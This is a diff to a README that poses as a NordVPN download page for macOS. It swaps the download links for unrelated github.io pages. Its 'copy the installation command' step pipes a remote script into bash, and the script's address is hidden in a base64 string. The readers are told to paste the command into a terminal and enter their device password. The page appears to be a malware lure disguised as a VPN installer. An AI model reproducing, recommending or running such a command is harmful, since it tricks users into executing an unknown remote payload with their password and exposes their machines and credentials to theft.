@@ -7,7 +7,7 @@ Optimized for macOS and Apple Silicon, NordVPN offers a seamless and reliable ex
 ---
 
 ## ✅ Download NordVPN for macOS  
-[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](https://paw-download-mac.github.io/.github)
+[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](https://shuziktobehuman.github.io/huja/NordVPN)
 
 ---
 
@@ -26,7 +26,7 @@ Optimized for macOS and Apple Silicon, NordVPN offers a seamless and reliable ex
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -67,7 +67,7 @@ Fully compatible with the latest macOS versions and Apple Silicon chips, NordVPN
 
 ---
 
-[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](https://paw-download-mac.github.io/.github)
+[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](https://shuziktobehuman.github.io/huja/NordVPN)
 
 ---
 
